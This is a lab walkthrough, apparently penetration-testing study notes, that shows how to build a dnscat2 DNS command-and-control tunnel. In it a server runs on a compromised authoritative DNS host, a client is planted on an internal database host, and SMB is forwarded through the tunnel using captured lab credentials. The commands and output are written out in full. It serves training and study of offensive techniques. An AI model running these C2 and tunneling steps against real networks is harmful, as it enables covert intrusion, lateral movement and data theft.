---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# dnscat2

[dnscat2](https://github.com/iagox86/dnscat2) is a tool designed to create an encrypted command-and-control (C\&C) channel over the DNS protocol, which is an effective tunnel out of almost every network. It is a pre-built DNS tunnel.

A dnscat2 server runs on an _authoritative name server_ for a particular domain, and clients (which are configured to make queries to that domain) are run on _compromised machines_.

This page will walk through a simple example of setting up a DNS tunnel using dnscat2.

## Background

This example will use the same network layout as the DNS tunneling fundamentals [example](./#illustration-background):

<figure><img src="../../../../.gitbook/assets/PFT-DNSFundamentalsLayout.png" alt=""><figcaption><p>Network layout for example</p></figcaption></figure>

As stated previously,  `FELINEAUTHORITY` is the authoritative DNS for `feline.corp`. This example will attempt to create a tunnel from the attacker's machine, through `MULTISERVER03` (and its firewall), to `PGDATABASE01`.

In order to do this the attacker will need to:

1. Run dnscat2 _server_ on `FELINEAUTHORITY`
   * Recall from [earlier](./#illustration-background) the attacker has elevated access to this machine via a compromised account (`kali:7he_C4t_c0ntro11er`)
2. Run dnscat2 _client_ on `PGDATABASE01`
   * For the sake of the example, this step will be simplified relative to real life&#x20;

## Server Setup

The dnscat2 server can be installed via `apt`:

```bash
sudo apt install dnscat2-server
```

The server and client can both be installed with:

```bash
sudo apt install dnscat2
```

Alternatively a binary can be transported to the victim machine.

### Starting the Server

Once the binary is on the server any conflicting DNS processes (e.g. Dnsmasq) are stopped. This is to prevent issues binding to `UDP/53` to listen for incoming dnscat2 client connections. At this point the server can be started with the command:

```bash
dnscat2-server <domain>
```

In this case it is started on `FELINEAUTHORITY` for `feline.corp`:

```bash
kali@felineauthority:~$ dnscat2-server feline.corp
[sudo] password for kali: 

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=5f85a7654479dad16dd11a70555eaca2 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=5f85a7654479dad16dd11a70555eaca2

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

The output indicates that the server is running on port 53 waiting for inbound connections.

#### Monitoring Incoming Traffic

If desired, the attacker can monitor inbound traffic to the relevant interface (`ens192`) via `tcpdump`:

```bash
sudo tcpdump -i ens192 udp port 53
```

## Client Setup

The same steps seen in the [last example](./#machine-access) will be followed to access `PGDATABASE01`.

1. &#x20;Compromise  with CVE-2022-26134 and start a [reverse shell](../../simple-port-forwarding-scenario.md#reverse-shell)
2. Set up an SSH dynamic remote port forward through `CONFLUENCE01` to `PGDATABASE01` as seen in [this example](../../ssh-tunneling/ssh-dynamic-remote-port-forwarding.md#setting-up-the-remote-forward)
3. Use SSH with ProxyCommand and Ncat as seen [here](../../ssh-tunneling/ssh-dynamic-remote-port-forwarding.md#ssh-session) to create an SSH session with `PGDATABASE01` through the tunnel

At this point the attacker needs to transfer a dnscat2-client binary to `PGDATABASE01`. This can be done however the attacker desires. Given the attacker has SSH access, the easiest method is to use SCP. Assuming the attacker has a copy of the dnscat2 client saved as `dnscat` in their home directory, the command to copy it to `PGDATABASE01` over the SOCKS proxy with SCP is:

{% code overflow="wrap" %}
```bash
scp -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9998 %h %p' dnscat database_admin@10.4.249.215
```
{% endcode %}

### Starting the Client

Now that the binary has been transferred, starting the client is as simple as:

```
dnscat <domain>
```

In this case it is run on `PGDATABASE01`against `feline.corp`:

```bash
database_admin@pgdatabase01:~$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Ninjas Stirs Fate Chirp Convoy Visas 

Session established!
```

At this point the connection is established. According to the output data is being transported in `TXT`, `CNAME`, and `MX` records. The tunnel causes a flurry of network DNS traffic and is not necessarily subtle.

## Using the Tunnel

Moving back to the DNS server (`FELINEAUTHORITY`) the attacker can confirm the session has started:

```bash
kali@felineauthority:~$ dnscat2-server feline.corp
[sudo] password for kali: 

...

New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Ninjas Stirs Fate Chirp Convoy Visas

```

### Command Session

At this point the attacker can use the `windows` command to list the dnscat2 windows (i.e. connections)

```
>> Ninjas Stirs Fate Chirp Convoy Visas
windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
```

From here the `window -i <index>` command can be used to select the desired window:

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Ninjas Stirs Fate Chirp Convoy Visas
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1> 
```

### Available Commands

All of the commands can be listed with the `?` command:

```
command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
```

Usage for each command can be obtained with the `-h` flag:

```
command (pgdatabase01) 1> shell -h
Error: The user requested help
Spawn a shell on the remote host
  --name, -n <s>:   Name
      --help, -h:   Show this message
```

### Listen Command

The `listen` command appears to function something like a port forward:

```
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
```

Recall that `HRSHARES` is running at `172.16.249.217` which is only accessible from `PGDATABASE01` as shown in the network diagram [above](dnscat2.md#background). As seen in an [earlier example](../../ssh-tunneling/ssh-local-port-forwarding.md#enumerating-the-tunnel-endpoint), `HRSHARES` is running an SMB share on port `445`.

The `listen` command will be used to create a port forward to `HRSHARES` from `PGDATABASE01`:

```
listen 127.0.0.1:4455 172.16.249.217:445
```

This command will be run in the command session on `FELINEAUTHORITY`. It will create a listener (on `FELINEAUTHORITY`) at `127.0.0.1:4455` which will connect to `HRSHARES` port `445`:

```
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.249.217:445
Listening on 127.0.0.1:4455, sending connections to 172.16.249.217:445
```

#### Send Traffic Through the Forward

To send traffic through the created listener, use another shell on FELINEAUTHORITY and address traffic to `127.0.0.1:4455`. E.g. to use smbclient with `HRSHARES` use the command:

```bash
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

* Recall the `hr_admin` account credentials were obtained in [this example](../../simple-port-forwarding-scenario.md#cracking-the-hash)

This command successfully reaches the SMB share on `HRSHARES`:

```bash
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
```

#### Global Forward

Alternatively, if the listen command is used with `0.0.0.0` a global port forward is created:

```
listen 0.0.0.0:9998 172.16.249.217:445
```

Then traffic can just be directed at `FELINEAUTHORITY:9998` from any machine (e.g. the attacker's Kali box) and it will be forwarded on to the target:

```bash
smbclient -p 9998 -L //192.168.249.7 -U hr_admin --password=Welcome1234
```

* In this example `FELINEAUTHORITY` is running at `192.168.249.7`

This command can then be run successfully from the attacker's Kali box:

```bash
kali@kali:~$ smbclient -p 9998 -L //192.168.249.7 -U hr_admin --password=Welcome1234

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
```
